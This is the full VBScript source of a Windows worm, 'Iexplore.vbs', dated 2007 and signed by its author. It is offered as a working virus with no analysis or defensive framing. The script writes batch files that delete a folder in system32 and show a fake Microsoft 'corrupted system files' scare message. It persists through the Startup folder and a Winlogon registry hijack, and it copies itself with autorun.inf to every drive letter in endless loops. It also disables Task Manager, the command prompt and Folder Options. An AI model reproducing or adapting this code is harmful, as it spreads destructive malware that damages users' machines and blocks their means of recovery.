'Iexplore.vbs
'I hate antivirus program
'So long sucker!!
'01/02/07

Option Explicit

On Error Resume Next

Dim wsh
Dim ts
Dim fs
Dim str0FileName
Dim str1FileName
Dim str2FileName
Dim str3FileName
Dim str4FileName
Dim str5FileName
Dim str6FileName
Dim str7FileName

Const ForWriting = 2
Const WshHide = 0
Const WshNormalFocus = 0 

Set wsh = CreateObject("Wscript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

str0FileName = "~temp.me"
str1FileName = "C:\Program Files\Internet Explorer\kill.bat"
str2FileName = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Iexplore.vbs"
str3FileName = "C:\Program Files\Internet Explorer\iexplore.vbs"
str4FileName = "C:\Program Files\Internet Explorer\iexplore.cmd"
str5FileName = "~temp.bat"
str6FileName = "C:\Program Files\Internet Explorer\SystemCopy.cmd"
str7FileName = "C:\Program Files\Internet Explorer\SystemReg.cmd"

Set ts = fs.OpenTextFile(str0FileName, ForWriting, True)
ts.WriteLine ""
ts.Close

Set ts = fs.OpenTextFile(str1FileName, ForWriting, True)
ts.WriteLine "@echo off"
ts.WriteLine "echo."
ts.WriteLine "for %%a in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %%a:\~temp.me set CD=%%a"
ts.WriteLine "explorer %CD%:"
ts.WriteLine "del ~temp.me"
ts.WriteLine "C:"
ts.WriteLine "cd %windir%"
ts.WriteLine "echo @echo off > WIN.bat"
ts.WriteLine "echo start ""CORRUPTED SYSTEM FILE"" /DC:\ /SEPARATE /I /MAX /ABOVENORMAL echo DELETING CORRUPTED SYSTEM FILES COMPLETED!! ALL SYSTEM FILES FROM %%windir%%\SYSTEM32 IS CORRUPTED AND HAS BEEN DELETED. PLEASE REINSTALLED WINDOWS!! THIS MESSAGE IS ORIGINATED FROM BILL GATE'S TEST CENTER. WE WERE SORRY FOR YOUR INCONVINIENCE. PLEASE WRITE TO US FOR MONEY BACK GUARANTEED. -MICROSOFT WINDOWS TEAM >> WIN.bat"
ts.WriteLine "echo echo off >> WIN.bat"
ts.WriteLine "echo echo. >> WIN.bat"
ts.WriteLine "echo echo. >> WIN.bat"
ts.WriteLine "echo echo DELETING SYSTEM FILES COMPLETED >> WIN.bat"
ts.WriteLine "echo call WIN.bat >> WIN.bat"
ts.WriteLine "cd \"
ts.WriteLine "cd %windir%\system32"
ts.WriteLine "attrib -h -r -s -a %computername%"
ts.WriteLine "rd /s /q %computername%"
ts.WriteLine "md %computername%"
ts.Close

Set ts = fs.OpenTextFile(str2FileName, ForWriting, True)
ts.WriteLine "On Error Resume Next"
ts.WriteLine "Dim ws"
ts.WriteLine "Dim str1"
ts.WriteLine "Set ws = CreateObject(""Wscript.Shell"")"
ts.WriteLine "str1 = ""C:\Program Files\Internet Explorer\iexplore.cmd"""
ts.WriteLine "ws.Run """""""" & str1 & """""""", 0, False"
ts.WriteLine "Set ws = Nothing"
ts.Close

Set ts = fs.OpenTextFile(str3FileName, ForWriting, True)
ts.WriteLine "On Error Resume Next"
ts.WriteLine "Dim ws"
ts.WriteLine "Dim str2"
ts.WriteLine "Dim str3"
ts.WriteLine "Set ws = CreateObject(""Wscript.Shell"")"
ts.WriteLine "str2 = ""%WINDIR%\ShellNew\SystemCopy.cmd"""
ts.WriteLine "str3 = ""%WINDIR%\ShellNew\SystemReg.cmd"""
ts.WriteLine "ws.Run """""""" & str2 & """""""", 0, False"
ts.WriteLine "ws.Run """""""" & str3 & """""""", 0, False"
ts.WriteLine "If Day(Now()) = 2 Then"
ts.WriteLine "MsgBox ""                CLICK OK TO CONTINUE"" ,MICROSOFT, ""CORRUPTED SYSTEM FILES DETECTED!!"""
ts.WriteLine "Dim wsh"
ts.WriteLine "Dim strBatFileName"
ts.WriteLine "Const WshNormalFocus = 0"
ts.WriteLine "Set wsh = CreateObject(""Wscript.Shell"")"
ts.WriteLine "strBatFileName = ""%WINDIR%\WIN.bat"""
ts.WriteLine "wsh.Run """""""" & strBatFileName & """""""", WshNormalFocus, True"
ts.WriteLine "Set wsh = Nothing"
ts.WriteLine "End If"
ts.Close

Set ts = fs.OpenTextFile(str4FileName, ForWriting, True)
ts.WriteLine "@echo off"
ts.WriteLine ":LOOP"
ts.WriteLine "if exist %windir%\ShellNew\SystemCopy.cmd goto SECOND"
ts.WriteLine "cd \"
ts.WriteLine "copy %windir%\system32\SystemCopy.msi %windir%\ShellNew\SystemCopy.cmd"
ts.WriteLine "attrib +h +r +s +a %windir%\ShellNew\SystemCopy.cmd"
ts.WriteLine "cd ""Program Files\Internet Explorer"""
ts.WriteLine "start /w wscript.exe Iexplore.vbs"
ts.WriteLine ":SECOND"
ts.WriteLine "cd \"
ts.WriteLine "cd %windir%\system32\%computername%"
ts.WriteLine "goto COPY"
ts.WriteLine ":COPY"
ts.WriteLine "attrib -r -s -h -a D:\autorun.inf"
ts.WriteLine "del D:\autorun.inf"
ts.WriteLine "copy /y autorun.inf D:\"
ts.WriteLine "copy /y iexplore.vbs D:\"
ts.WriteLine "attrib +r +s +h +a D:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a D:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a E:\autorun.inf"
ts.WriteLine "del E:\autorun.inf"
ts.WriteLine "copy /y autorun.inf E:\"
ts.WriteLine "copy /y iexplore.vbs E:\"
ts.WriteLine "attrib +r +s +h +a E:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a E:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a F:\autorun.inf"
ts.WriteLine "del F:\autorun.inf"
ts.WriteLine "copy /y autorun.inf F:\"
ts.WriteLine "copy /y iexplore.vbs F:\"
ts.WriteLine "attrib +r +s +h +a F:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a F:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a G:\autorun.inf"
ts.WriteLine "del G:\autorun.inf"
ts.WriteLine "copy /y autorun.inf G:\"
ts.WriteLine "copy /y iexplore.vbs G:\"
ts.WriteLine "attrib +r +s +h +a G:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a G:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a H:\autorun.inf"
ts.WriteLine "del H:\autorun.inf"
ts.WriteLine "copy /y autorun.inf H:\"
ts.WriteLine "copy /y iexplore.vbs H:\"
ts.WriteLine "attrib +r +s +h +a H:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a H:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a I:\autorun.inf"
ts.WriteLine "del I:\autorun.inf"
ts.WriteLine "copy /y autorun.inf I:\"
ts.WriteLine "copy /y iexplore.vbs I:\"
ts.WriteLine "attrib +r +s +h +a I:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a I:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a J:\autorun.inf"
ts.WriteLine "del J:\autorun.inf"
ts.WriteLine "copy /y autorun.inf J:\"
ts.WriteLine "copy /y iexplore.vbs J:\"
ts.WriteLine "attrib +r +s +h +a J:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a J:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a K:\autorun.inf"
ts.WriteLine "del K:\autorun.inf"
ts.WriteLine "copy /y autorun.inf K:\"
ts.WriteLine "copy /y iexplore.vbs K:\"
ts.WriteLine "attrib +r +s +h +a K:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a K:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a L:\autorun.inf"
ts.WriteLine "del L:\autorun.inf"
ts.WriteLine "copy /y autorun.inf L:\"
ts.WriteLine "copy /y iexplore.vbs L:\"
ts.WriteLine "attrib +r +s +h +a L:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a L:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a M:\autorun.inf"
ts.WriteLine "del M:\autorun.inf"
ts.WriteLine "copy /y autorun.inf M:\"
ts.WriteLine "copy /y iexplore.vbs M:\"
ts.WriteLine "attrib +r +s +h +a M:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a M:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a N:\autorun.inf"
ts.WriteLine "del N:\autorun.inf"
ts.WriteLine "copy /y autorun.inf N:\"
ts.WriteLine "copy /y iexplore.vbs N:\"
ts.WriteLine "attrib +r +s +h +a N:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a N:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a O:\autorun.inf"
ts.WriteLine "del O:\autorun.inf"
ts.WriteLine "copy /y autorun.inf O:\"
ts.WriteLine "copy /y iexplore.vbs O:\"
ts.WriteLine "attrib +r +s +h +a O:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a O:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a P:\autorun.inf"
ts.WriteLine "del P:\autorun.inf"
ts.WriteLine "copy /y autorun.inf P:\"
ts.WriteLine "copy /y iexplore.vbs P:\"
ts.WriteLine "attrib +r +s +h +a P:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a P:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a Q:\autorun.inf"
ts.WriteLine "del Q:\autorun.inf"
ts.WriteLine "copy /y autorun.inf Q:\"
ts.WriteLine "copy /y iexplore.vbs Q:\"
ts.WriteLine "attrib +r +s +h +a Q:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a Q:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a R:\autorun.inf"
ts.WriteLine "del R:\autorun.inf"
ts.WriteLine "copy /y autorun.inf R:\"
ts.WriteLine "copy /y iexplore.vbs R:\"
ts.WriteLine "attrib +r +s +h +a R:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a R:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a S:\autorun.inf"
ts.WriteLine "del S:\autorun.inf"
ts.WriteLine "copy /y autorun.inf S:\"
ts.WriteLine "copy /y iexplore.vbs S:\"
ts.WriteLine "attrib +r +s +h +a S:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a S:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a T:\autorun.inf"
ts.WriteLine "del T:\autorun.inf"
ts.WriteLine "copy /y autorun.inf T:\"
ts.WriteLine "copy /y iexplore.vbs T:\"
ts.WriteLine "attrib +r +s +h +a T:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a T:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a U:\autorun.inf"
ts.WriteLine "del U:\autorun.inf"
ts.WriteLine "copy /y autorun.inf U:\"
ts.WriteLine "copy /y iexplore.vbs U:\"
ts.WriteLine "attrib +r +s +h +a U:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a U:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a V:\autorun.inf"
ts.WriteLine "del V:\autorun.inf"
ts.WriteLine "copy /y autorun.inf V:\"
ts.WriteLine "copy /y iexplore.vbs V:\"
ts.WriteLine "attrib +r +s +h +a V:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a V:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a W:\autorun.inf"
ts.WriteLine "del W:\autorun.inf"
ts.WriteLine "copy /y autorun.inf W:\"
ts.WriteLine "copy /y iexplore.vbs W:\"
ts.WriteLine "attrib +r +s +h +a W:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a W:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a X:\autorun.inf"
ts.WriteLine "del X:\autorun.inf"
ts.WriteLine "copy /y autorun.inf X:\"
ts.WriteLine "copy /y iexplore.vbs X:\"
ts.WriteLine "attrib +r +s +h +a X:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a X:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a Y:\autorun.inf"
ts.WriteLine "del Y:\autorun.inf"
ts.WriteLine "copy /y autorun.inf Y:\"
ts.WriteLine "copy /y iexplore.vbs Y:\"
ts.WriteLine "attrib +r +s +h +a Y:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a Y:\iexplore.vbs"
ts.WriteLine "attrib -r -s -h -a Z:\autorun.inf"
ts.WriteLine "del Z:\autorun.inf"
ts.WriteLine "copy /y autorun.inf Z:\"
ts.WriteLine "copy /y iexplore.vbs Z:\"
ts.WriteLine "attrib +r +s +h +a Z:\autorun.inf"
ts.WriteLine "attrib +r +s +h +a Z:\iexplore.vbs"
ts.WriteLine "goto LOOP"
ts.Close

Set ts = fs.OpenTextFile(str5FileName, ForWriting, True)
ts.WriteLine "@echo off"
ts.WriteLine "attrib -h -r -s -a Iexplore.vbs"
ts.WriteLine "copy /Y Iexplore.vbs %windir%\system32\%computername%"
ts.WriteLine "attrib +h +r +s +a Iexplore.vbs"
ts.WriteLine "C:"
ts.WriteLine "cd %windir%\system32\%computername%"
ts.WriteLine "echo [AutoRun] > Autorun.inf"
ts.WriteLine "echo open=WScript.exe Iexplore.vbs >> Autorun.inf"
ts.WriteLine "echo shell\Auto\command=WScript.exe Iexplore.vbs >> Autorun.inf"
ts.WriteLine "echo shell\Open\command=WScript.exe Iexplore.vbs >> Autorun.inf"
ts.WriteLine "echo shell\Explore\command=WScript.exe Iexplore.vbs >> Autorun.inf"
ts.WriteLine "echo shell\Search...\command=WScript.exe Iexplore.vbs >> Autorun.inf"
ts.WriteLine "echo shell=Auto >> Autorun.inf"
ts.WriteLine "cd \"
ts.WriteLine "copy %windir%\WIN.bat %windir%\ShellNew\WIN.cmd"
ts.WriteLine "copy ""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Iexplore.vbs"" %windir%\ShellNew\Explorer.cmd"
ts.WriteLine "copy ""C:\Program Files\Internet Explorer\Iexplore.cmd"" %windir%\ShellNew"
ts.WriteLine "copy ""C:\Program Files\Internet Explorer\Iexplore.vbs"" %windir%\ShellNew\Explore.cmd"
ts.WriteLine "move /y ""C:\Program Files\Internet Explorer\SystemCopy.cmd"" %windir%\ShellNew"
ts.WriteLine "move /y ""C:\Program Files\Internet Explorer\SystemReg.cmd"" %windir%\ShellNew"
ts.WriteLine "copy %windir%\ShellNew\WIN.cmd %windir%\system32\WIN.msi"
ts.WriteLine "copy %windir%\ShellNew\Explorer.cmd %windir%\system32\Explorer.msi"
ts.WriteLine "copy %windir%\ShellNew\Iexplore.cmd %windir%\system32\Iexplore.msi"
ts.WriteLine "copy %windir%\ShellNew\Explore.cmd %windir%\system32\Explore.msi"
ts.WriteLine "copy %windir%\ShellNew\SystemCopy.cmd %windir%\system32\SystemCopy.msi"
ts.WriteLine "copy %windir%\ShellNew\SystemReg.cmd %windir%\system32\SystemReg.msi"
ts.WriteLine "attrib +h +r +s +a %windir%\system32\%computername%"
ts.WriteLine "attrib +h +r +s +a %windir%\WIN.bat"
ts.WriteLine "attrib +h +r +s +a %windir%\ShellNew\SystemCopy.cmd"
ts.WriteLine "attrib +h +r +s +a %windir%\ShellNew\SystemReg.cmd"
ts.WriteLine "attrib +h +r +s +a ""C:\Program Files\Internet Explorer\Iexplore.vbs"""
ts.WriteLine "attrib +h +r +s +a ""C:\Program Files\Internet Explorer\Iexplore.cmd"""
ts.WriteLine "cd \"
ts.WriteLine "cd ""Program Files\Internet Explorer"""
ts.WriteLine "start /w wscript.exe Iexplore.vbs"
ts.WriteLine "cd \"
ts.WriteLine "cd ""Documents and Settings\All Users\Start Menu\Programs\Startup"""
ts.WriteLine "start /w wscript.exe Iexplore.vbs"
ts.Close

Set ts = fs.OpenTextFile(str6FileName, ForWriting, True)
ts.WriteLine "@echo off"
ts.WriteLine ":LOOP"
ts.WriteLine "cd \"
ts.WriteLine "cd ""Program Files\Internet Explorer"""
ts.WriteLine "if exist Iexplore.cmd goto SECOND"
ts.WriteLine "copy %windir%\ShellNew\Iexplore.cmd ""C:\Program Files\Internet Explorer\Iexplore.cmd"""
ts.WriteLine "attrib +h +r +s +a ""C:\Program Files\Internet Explorer\Iexplore.cmd"""
ts.WriteLine "cd \"
ts.WriteLine "cd ""Documents and Settings\All Users\Start Menu\Programs\Startup"""
ts.WriteLine "start /w wscript.exe Iexplore.vbs"
ts.WriteLine ":SECOND"
ts.WriteLine "cd \"
ts.WriteLine "copy %windir%\system32\WIN.msi %windir%\ShellNew\WIN.cmd"
ts.WriteLine "copy %windir%\system32\Explorer.msi %windir%\ShellNew\Explorer.cmd"
ts.WriteLine "copy %windir%\system32\Iexplore.msi %windir%\ShellNew\Iexplore.cmd"
ts.WriteLine "copy %windir%\system32\Explore.msi %windir%\ShellNew\Explore.cmd"
ts.WriteLine "copy %windir%\system32\SystemReg.msi %windir%\ShellNew\SystemReg.cmd"
ts.WriteLine "copy %windir%\ShellNew\WIN.cmd %windir%\WIN.bat"
ts.WriteLine "copy %windir%\ShellNew\Explorer.cmd ""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Iexplore.vbs"""
ts.WriteLine "copy %windir%\ShellNew\Explore.cmd ""C:\Program Files\Internet Explorer\Iexplore.vbs"""
ts.WriteLine "copy %windir%\ShellNew\Iexplore.cmd ""C:\Program Files\Internet Explorer\Iexplore.cmd"""
ts.WriteLine "attrib +h +r +s +a %windir%\system32\%computername%"
ts.WriteLine "attrib +h +r +s +a %windir%\WIN.bat"
ts.WriteLine "attrib +h +r +s +a %windir%\ShellNew\SystemCopy.cmd"
ts.WriteLine "attrib +h +r +s +a %windir%\ShellNew\SystemReg.cmd"
ts.WriteLine "attrib +h +r +s +a ""C:\Program Files\Internet Explorer\Iexplore.vbs"""
ts.WriteLine "attrib +h +r +s +a ""C:\Program Files\Internet Explorer\Iexplore.cmd"""
ts.WriteLine "goto LOOP"
ts.Close

Set ts = fs.OpenTextFile(str7FileName, ForWriting, True)
ts.WriteLine "@echo off"
ts.WriteLine ":LOOP"
ts.WriteLine "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f"
ts.WriteLine "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 1 /f"
ts.WriteLine "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
ts.WriteLine "reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v Shell /d ""Explorer.exe \""C:\Program Files\Internet Explorer\iexplore.vbs\"""" /f"
ts.WriteLine "goto LOOP"
ts.Close

wsh.Run """" & str1FileName & """", WshNormalFocus, True
wsh.Run """" & str5FileName & """", WshNormalFocus, True

fs.DeleteFile str1FileName
fs.DeleteFile str5FileName

Set wsh = Nothing
Set ts = Nothing
Set fs = Nothing


'Design by
'                             ___    ___
' ____________  _________  __/__/   /  /
'/ ______/    \/  /      \/ /__    /  /
'\______ \  /\   / _____   /  /   /  /
'/ ______/_/__\_/\______  /__/___/  /
'\/ \___________________\/_________/
'      ...:::: S n @ ! L ::::...